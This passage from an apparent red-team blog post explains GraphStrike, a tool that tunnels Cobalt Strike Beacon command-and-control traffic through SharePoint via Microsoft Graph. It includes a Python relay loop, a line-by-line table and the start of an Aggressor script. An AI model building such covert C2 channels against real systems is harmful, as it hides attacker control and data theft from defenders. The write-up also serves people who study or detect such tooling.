class="enlighter-k4"># If state is removing + killThread has been signaled, kill Beacon thread here.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'state'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">state</span><span class="enlighter-text"> == 'removing'</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k3">and</span><span class="enlighter-text"> comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'killThread'</span><span class="enlighter-g1">]</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-m0">p_info</span><span class="enlighter-g1">(</span><span class="enlighter-text">f</span><span class="enlighter-s0">"Beacon {comms['beaconId']}: removed from CS -&gt; killing thread"</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k0">return</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Clear event handler so that we will block again in the future on this Beacon output file</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'outputReady'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">clear</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Download the Beacon output file</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            data = </span><span class="enlighter-m0">DownloadFile</span><span class="enlighter-g1">(</span><span class="enlighter-text">comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'http-post'</span><span class="enlighter-g1">])</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Zero out the Beacon output file to signal Beacon we have received the last</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">UploadFile</span><span class="enlighter-g1">(</span><span class="enlighter-text">comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'http-post'</span><span class="enlighter-g1">]</span><span class="enlighter-text">, </span><span class="enlighter-m0">str</span><span class="enlighter-g1">())</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Send data to TS</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">SendPostToTS</span><span class="enlighter-g1">(</span><span class="enlighter-text">fileName, data</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># If state is 'exiting' and killThread == True, we wait until here to kill Beacon thread so that</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Beacon acknowledgement of exit is received + sent to TS</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'state'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">state</span><span class="enlighter-text"> == 'exiting'</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k3">and</span><span class="enlighter-text"> comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'killThread'</span><span class="enlighter-g1">]</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-m0">p_info</span><span class="enlighter-g1">(</span><span class="enlighter-text">f</span><span class="enlighter-s0">"Beacon {comms['beaconId']}: exited gracefully -&gt; killing thread"</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k0">return</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Get the current time after the wait has ended and calculate the difference </span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            at = datetime.</span><span class="enlighter-m3">datetime</span><span class="enlighter-text">.</span><span class="enlighter-m3">now</span><span class="enlighter-g1">(</span><span class="enlighter-text">datetime.</span><span class="enlighter-m3">timezone</span><span class="enlighter-text">.</span><span class="enlighter-m3">utc</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            elapsedTime = </span><span class="enlighter-g1">(</span><span class="enlighter-text">at - bt</span><span class="enlighter-g1">)</span><span class="enlighter-text">.</span><span class="enlighter-m3">total_seconds</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Continue to sleep for the remainder of the sleep cycle</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> elapsedTime </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'sleepTime'</span><span class="enlighter-g1">]</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-m0">print</span><span class="enlighter-g1">(</span><span class="enlighter-text">f</span><span class="enlighter-s0">"continuing to sleep for: {str(comms['sleepTime'] - elapsedTime)} seconds longer..."</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                time.</span><span class="enlighter-m3">sleep</span><span class="enlighter-g1">(</span><span class="enlighter-text">comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'sleepTime'</span><span class="enlighter-g1">]</span><span class="enlighter-text"> - elapsedTime</span><span class="enlighter-g1">)</span></div></div></div><div class="enlighter-raw">  def BeaconComms(fileName):

    # Retrieve entry from dictionary
    comms = masterTracker[fileName]

    # Run in endless loop
    while True:

        # Block here depending on state of taskingReady event handler
        comms['taskingReady'].wait()
        
        # If killThread is true, a TS task has been queued for Beacon without it retrieving it for longer than
        # the allowed timeout and this BeaconComms channel has been signaled to exit to conserve resources.
        if comms['state'].state == 'timeout' and comms['killThread']:
            p_info(f"Beacon {comms['beaconId']}: timed out -&gt; killing thread.")
            return

        # Send Beacon http-get to TS + return any tasking
        tasking = SendGetToTS(fileName, False)
        
        # If TS returned data, we need to upload it to the TS tasking file
        if len(tasking) &gt; 0:
            UploadFile(fileName, tasking)

            # Clear taskingReady event handler so that we will block at the start of next loop until we see
            # that Beacon has received + cleared the TS tasking file
            comms['taskingReady'].clear()

        # Get current time before waiting for signal
        bt = datetime.datetime.now(datetime.timezone.utc)

        # Wait until we are signaled that Beacon has output, up to a max of the Beacon's sleep time
        comms['outputReady'].wait(comms['sleepTime'])

        # If the sleep ended because we were signaled, retrieve it and send to TS
        if comms['outputReady'].is_set():

            # If state is removing + killThread has been signaled, kill Beacon thread here.
            if (comms['state'].state == 'removing') and comms['killThread']:
                p_info(f"Beacon {comms['beaconId']}: removed from CS -&gt; killing thread")
                return

            # Clear event handler so that we will block again in the future on this Beacon output file
            comms['outputReady'].clear()

            # Download the Beacon output file
            data = DownloadFile(comms['http-post'])

            # Zero out the Beacon output file to signal Beacon we have received the last
            UploadFile(comms['http-post'], str())

            # Send data to TS
            SendPostToTS(fileName, data)

            # If state is 'exiting' and killThread == True, we wait until here to kill Beacon thread so that
            # Beacon acknowledgement of exit is received + sent to TS
            if (comms['state'].state == 'exiting') and comms['killThread']:
                p_info(f"Beacon {comms['beaconId']}: exited gracefully -&gt; killing thread")
                return

            # Get the current time after the wait has ended and calculate the difference 
            at = datetime.datetime.now(datetime.timezone.utc)
            elapsedTime = (at - bt).total_seconds()

            # Continue to sleep for the remainder of the sleep cycle
            if elapsedTime &lt; comms['sleepTime']:
                print(f"continuing to sleep for: {str(comms['sleepTime'] - elapsedTime)} seconds longer...")
                time.sleep(comms['sleepTime'] - elapsedTime)</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">  def BeaconComms(fileName):

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Retrieve&nbsp;entry&nbsp;from&nbsp;dictionary
&nbsp;&nbsp;&nbsp;&nbsp;comms&nbsp;=&nbsp;masterTracker[fileName]

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Run&nbsp;in&nbsp;endless&nbsp;loop
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Block&nbsp;here&nbsp;depending&nbsp;on&nbsp;state&nbsp;of&nbsp;taskingReady&nbsp;event&nbsp;handler
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comms['taskingReady'].wait()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;killThread&nbsp;is&nbsp;true,&nbsp;a&nbsp;TS&nbsp;task&nbsp;has&nbsp;been&nbsp;queued&nbsp;for&nbsp;Beacon&nbsp;without&nbsp;it&nbsp;retrieving&nbsp;it&nbsp;for&nbsp;longer&nbsp;than
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;the&nbsp;allowed&nbsp;timeout&nbsp;and&nbsp;this&nbsp;BeaconComms&nbsp;channel&nbsp;has&nbsp;been&nbsp;signaled&nbsp;to&nbsp;exit&nbsp;to&nbsp;conserve&nbsp;resources.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;comms['state'].state&nbsp;==&nbsp;'timeout'&nbsp;and&nbsp;comms['killThread']:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p_info(f"Beacon&nbsp;{comms['beaconId']}:&nbsp;timed&nbsp;out&nbsp;-&gt;&nbsp;killing&nbsp;thread.")
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Send&nbsp;Beacon&nbsp;http-get&nbsp;to&nbsp;TS&nbsp;+&nbsp;return&nbsp;any&nbsp;tasking
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tasking&nbsp;=&nbsp;SendGetToTS(fileName,&nbsp;False)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;TS&nbsp;returned&nbsp;data,&nbsp;we&nbsp;need&nbsp;to&nbsp;upload&nbsp;it&nbsp;to&nbsp;the&nbsp;TS&nbsp;tasking&nbsp;file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(tasking)&nbsp;&gt;&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UploadFile(fileName,&nbsp;tasking)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Clear&nbsp;taskingReady&nbsp;event&nbsp;handler&nbsp;so&nbsp;that&nbsp;we&nbsp;will&nbsp;block&nbsp;at&nbsp;the&nbsp;start&nbsp;of&nbsp;next&nbsp;loop&nbsp;until&nbsp;we&nbsp;see
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;that&nbsp;Beacon&nbsp;has&nbsp;received&nbsp;+&nbsp;cleared&nbsp;the&nbsp;TS&nbsp;tasking&nbsp;file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comms['taskingReady'].clear()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Get&nbsp;current&nbsp;time&nbsp;before&nbsp;waiting&nbsp;for&nbsp;signal
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bt&nbsp;=&nbsp;datetime.datetime.now(datetime.timezone.utc)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Wait&nbsp;until&nbsp;we&nbsp;are&nbsp;signaled&nbsp;that&nbsp;Beacon&nbsp;has&nbsp;output,&nbsp;up&nbsp;to&nbsp;a&nbsp;max&nbsp;of&nbsp;the&nbsp;Beacon's&nbsp;sleep&nbsp;time
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comms['outputReady'].wait(comms['sleepTime'])

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;the&nbsp;sleep&nbsp;ended&nbsp;because&nbsp;we&nbsp;were&nbsp;signaled,&nbsp;retrieve&nbsp;it&nbsp;and&nbsp;send&nbsp;to&nbsp;TS
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;comms['outputReady'].is_set():

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;state&nbsp;is&nbsp;removing&nbsp;+&nbsp;killThread&nbsp;has&nbsp;been&nbsp;signaled,&nbsp;kill&nbsp;Beacon&nbsp;thread&nbsp;here.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(comms['state'].state&nbsp;==&nbsp;'removing')&nbsp;and&nbsp;comms['killThread']:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p_info(f"Beacon&nbsp;{comms['beaconId']}:&nbsp;removed&nbsp;from&nbsp;CS&nbsp;-&gt;&nbsp;killing&nbsp;thread")
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Clear&nbsp;event&nbsp;handler&nbsp;so&nbsp;that&nbsp;we&nbsp;will&nbsp;block&nbsp;again&nbsp;in&nbsp;the&nbsp;future&nbsp;on&nbsp;this&nbsp;Beacon&nbsp;output&nbsp;file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comms['outputReady'].clear()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Download&nbsp;the&nbsp;Beacon&nbsp;output&nbsp;file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;DownloadFile(comms['http-post'])

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero&nbsp;out&nbsp;the&nbsp;Beacon&nbsp;output&nbsp;file&nbsp;to&nbsp;signal&nbsp;Beacon&nbsp;we&nbsp;have&nbsp;received&nbsp;the&nbsp;last
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UploadFile(comms['http-post'],&nbsp;str())

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Send&nbsp;data&nbsp;to&nbsp;TS
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SendPostToTS(fileName,&nbsp;data)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;state&nbsp;is&nbsp;'exiting'&nbsp;and&nbsp;killThread&nbsp;==&nbsp;True,&nbsp;we&nbsp;wait&nbsp;until&nbsp;here&nbsp;to&nbsp;kill&nbsp;Beacon&nbsp;thread&nbsp;so&nbsp;that
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Beacon&nbsp;acknowledgement&nbsp;of&nbsp;exit&nbsp;is&nbsp;received&nbsp;+&nbsp;sent&nbsp;to&nbsp;TS
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(comms['state'].state&nbsp;==&nbsp;'exiting')&nbsp;and&nbsp;comms['killThread']:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p_info(f"Beacon&nbsp;{comms['beaconId']}:&nbsp;exited&nbsp;gracefully&nbsp;-&gt;&nbsp;killing&nbsp;thread")
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Get&nbsp;the&nbsp;current&nbsp;time&nbsp;after&nbsp;the&nbsp;wait&nbsp;has&nbsp;ended&nbsp;and&nbsp;calculate&nbsp;the&nbsp;difference&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;at&nbsp;=&nbsp;datetime.datetime.now(datetime.timezone.utc)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elapsedTime&nbsp;=&nbsp;(at&nbsp;-&nbsp;bt).total_seconds()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Continue&nbsp;to&nbsp;sleep&nbsp;for&nbsp;the&nbsp;remainder&nbsp;of&nbsp;the&nbsp;sleep&nbsp;cycle
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;elapsedTime&nbsp;&lt;&nbsp;comms['sleepTime']:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"continuing&nbsp;to&nbsp;sleep&nbsp;for:&nbsp;{str(comms['sleepTime']&nbsp;-&nbsp;elapsedTime)}&nbsp;seconds&nbsp;longer...")
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(comms['sleepTime']&nbsp;-&nbsp;elapsedTime)</pre>
<p>The major events / functionalities are summarized in the table below. Line numbers separated by an arrow indicate that the line numbers on the right hand side and their described actions only occur if the logical condition found at the line number on the left is satisfied.</p>
</div>
</div>
</div>
</div>
<div class="pm-table-container with-shadow-observer" data-layout="custom">
<div class="pm-table-wrapper">
<table data-testid="renderer-table" data-number-column="false" data-table-width="760">
<colgroup>
<col>
<col></colgroup>
<tbody>
<tr>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="137" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="83120"><strong data-renderer-mark="true">Line Number(s)</strong></p>
</div>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="621" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="83138"><strong data-renderer-mark="true">Action / Details</strong></p>
</div>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="83160">10</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="83166">Block until the main ‘CheckBeacons’ function sees that this Beacon’s TS tasking file is blank and ready for more tasking.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="83293">19</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="83299">Send a GET request to the TS that is crafted to conform to the graphstrike profile in order to retrieve any tasking issued in Cobalt Strike.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="83445">22</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="83451">Logical branch depending on whether the TS returned tasking data from the GET request</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="83542">22 → 23/27</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="83556">Upload the data to the TS tasking file in SharePoint and then toggle the ‘taskingReady’ event handler so that we block at line 10 on the next loop.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="83709">33</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="83715">Sleep for the same period that Beacon is set to sleep for, OR until the ‘outputReady’ event handler is signaled which ends the sleep early.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="83860">36</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="83866">Logical branch depending on ‘CheckBeacons’ seeing that this Beacon’s output file is NOT blank and thus has output that should be downloaded.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="84012">36 → 44</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="84023">Reset the outputReady event handler so that we block/sleep at line 33 on the next loop.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="84116">36 → 47</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="84127">Download the Beacon output file data</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="84169">36 → 50</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="84181">Upload a blank file to the Beacon output file to signal Beacon that it can send more output.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="84279">36 → 53</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="84291">Send the Beacon output to the TS</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="137">
<p data-renderer-start-pos="84329">36 → 66/68</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="621">
<p data-renderer-start-pos="84343">Sleep for the remainder of Beacon’s sleep time if it hasn’t already fully elapsed.</p>
</td>
</tr>
</tbody>
</table>
<div class="sentinel-right"></div>
</div>
</div>
<p data-renderer-start-pos="84430">That’s basically it. While it is all pretty simple, there is one subject worth exploring a bit more which is how the server handles Cobalt Strike commands like ‘exit’, ‘remove’, and ‘sleep’. Each of these commands alters Beacon’s state on target, but because of GraphStrike’s architecture we also really need to act on these commands within the server as well. This isn’t any easy task, as the data that the TS returns when it issues a command is encrypted so we can’t easily tell when one of these commands has been issued. The solution involves using Cobalt Strike’s Aggressor scripting language to communicate with the GraphStrike server separately outside of when it connects to the TS for tasking. A portion of the GraphStrike.cna script that is used to do so may be seen here:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">alias exit </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">exitFunc</span><span class="enlighter-g1">(</span><span class="enlighter-text">$1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">sub exitFunc </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">local</span><span class="enlighter-g1">(</span><span class="enlighter-text">'$command $beaconIds </span><span class="enlighter-k11">@bids</span><span class="enlighter-text"> $id $data $output'</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># $1 gets passed in as different data types depending on how exit is called...</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">typeOf</span><span class="enlighter-g1">(</span><span class="enlighter-text">$1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> eq </span><span class="enlighter-s0">"class sleep.engine.types.StringValue"</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">add</span><span class="enlighter-g1">(</span><span class="enlighter-k11">@bids</span><span class="enlighter-text">, $1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">typeOf</span><span class="enlighter-g1">(</span><span class="enlighter-text">$1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> eq </span><span class="enlighter-s0">"class sleep.runtime.CollectionWrapper"</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span 